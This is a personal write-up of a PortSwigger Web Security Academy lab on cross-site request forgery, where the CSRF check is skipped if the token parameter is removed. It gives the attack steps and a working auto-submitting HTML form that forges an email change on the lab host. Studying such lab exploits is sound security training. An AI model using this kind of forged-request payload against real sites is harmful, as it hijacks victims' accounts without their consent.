# [CSRF where token validation depends on token being present] — [PortSwigger] — [Practitioner]
**Date:** 2026-06-08
 
---
 
## Vulnerability / core concept
Cross-site Request Forgery

## What made me stuck
This level was pretty straightforward and easy.
 
## What unblocked me
`null`
 
---


## Attack path
1) First we need to log in to get email change functionality.
2) After logging in, we can inspect the requests while we change our email.3) We can notice that when we are changing requests, the application checks two things: is csrf valid and is it present. If csrf is invalid, we get 400 status code with invalid csrf. However, if we delete csrf parameter completely, we can notice that request returns 302 found, so it works.
4) Now, using csrf PoC generator in caido or burp, we craft csrf payload and deliver it to victim using exploit server to complete csrf attack and complete the lab.

---


## Payload / key command
```html
<!DOCTYPE html>
  <html>
  <head>
      <title>CSRF PoC</title>
  </head>
  <body>
      <h3>Standard CSRF PoC</h3>
      <form action="https://0ace003b045ae5288355be1100280016.web-security-academy.net/my-account/change-email" method="post">
      <input type="hidden" name="email" value="babek@victim" />
          <input type="submit" value="Submit request" />
      </form>
      <script>
          history.pushState('', '', '/');
          document.forms[0].submit();
      </script>
  </body>
  </html>
```

---


## What I'd recognize faster next time
It is always important to check whether all of the parameters are required to send valid request. Sometimes requests still work without essential parameters like csrf that can lead to full account takeover.
 

